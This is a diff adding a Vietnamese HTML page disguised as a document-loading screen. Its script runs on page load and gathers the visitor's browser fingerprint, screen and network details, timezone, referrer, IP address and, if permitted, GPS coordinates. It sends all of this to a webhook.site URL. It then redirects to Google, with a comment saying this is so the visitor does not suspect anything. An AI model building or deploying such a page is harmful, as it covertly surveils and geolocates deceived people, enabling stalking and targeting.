@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang tải tài liệu...</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <p style="margin-left: 15px;">Vui lòng chờ trong giây lát...</p>
+
+    <script>
+        (async function() {
+            // --- CẤU HÌNH ---
+            const WEBHOOK_URL = "https://webhook.site/de82030e-a647-4012-b7f4-c539d868de62";
+            const REDIRECT_TO = "https://www.google.com"; // Chuyển hướng sau khi lấy tin xong
+
+            let data = {};
+
+            try {
+                // 1. Thông tin cơ bản từ Trình duyệt (Navigator)
+                data.browser = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency, // Số nhân CPU
+                    deviceMemory: navigator.deviceMemory // RAM (GB)
+                };
+
+                // 2. Thông tin Màn hình & Cửa sổ
+                data.screen = {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
+                };
+
+                // 3. Thông tin Mạng & Thời gian
+                data.network = navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : "Không hỗ trợ";
+
+                data.time = {
+                    localTime: new Date().toLocaleString(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                // 4. Thông tin Nguồn truy cập (Referrer)
+                data.context = {
+                    url: window.location.href,
+                    referrer: document.referrer || "Truy cập trực tiếp"
+                };
+
+                // 5. Lấy Địa chỉ IP (Dùng dịch vụ bên thứ 3)
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    data.ip = ipData.ip;
+                } catch (e) { data.ip = "Bị chặn bởi Adblock"; }
+
+                // 6. Lấy Tọa độ GPS (Nếu người dùng bấm "Cho phép")
+                if (navigator.geolocation) {
+                    await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                data.location = {
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy + " meters"
+                                };
+                                resolve();
+                            },
+                            () => {
+                                data.location = "Người dùng từ chối cấp quyền";
+                                resolve();
+                            },
+                            { timeout: 5000 }
+                        );
+                    });
+                }
+
+                // 7. GỬI DỮ LIỆU VỀ WEBHOOK
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Tránh lỗi CORS khi test
+                    body: JSON.stringify(data)
+                });
+
+            } catch (err) {
+                console.error("Lỗi:", err);
+            } finally {
+                // Cuối cùng là chuyển hướng để người dùng không nghi ngờ
+                setTimeout(() => {
+                    window.location.href = REDIRECT_TO;
+                }, 1000);
+            }
+        })();
+    </script>
+</body>
+</html>
